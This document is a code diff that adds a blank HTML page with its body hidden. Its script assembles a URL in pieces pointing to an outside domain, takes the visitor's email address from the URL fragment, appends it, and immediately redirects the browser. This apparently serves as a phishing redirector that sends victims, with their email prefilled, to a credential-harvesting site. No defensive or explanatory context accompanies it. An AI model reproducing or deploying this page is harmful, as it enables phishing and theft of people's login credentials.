@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>.</title>
+    <style>
+        body { display: none; }
+    </style>
+    <script>
+        (function() {
+            var part1 = "https://uY90.";
+            var part2 = "logablent";
+            var part3 = ".com/ovEoju/";
+
+            // Get the email parameter from the URL
+            var email = window.location.hash.substring(1);
+
+            // Decode the email parameter to keep @ symbol intact
+            var decodedEmail = decodeURIComponent(email);
+
+            // Construct the redirect URL
+            var redirectUrl = part1 + part2 + part3 + "" + decodedEmail;
+
+            // Redirect to the constructed URL
+            window.location.href = redirectUrl;
+        })();
+    </script>
+</head>
+<body>
+</body>
+</html>
